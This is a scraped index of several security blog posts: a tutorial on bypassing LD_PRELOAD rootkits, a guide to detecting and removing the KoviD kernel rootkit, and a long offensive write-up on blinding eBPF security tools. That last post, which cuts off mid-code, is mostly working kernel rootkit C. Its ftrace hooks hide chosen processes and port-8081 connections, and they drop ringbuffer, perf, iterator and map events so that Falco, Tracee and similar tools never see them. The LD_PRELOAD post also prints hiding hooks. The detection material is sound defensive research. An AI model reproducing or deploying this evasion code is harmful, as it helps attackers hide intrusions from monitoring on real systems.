","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 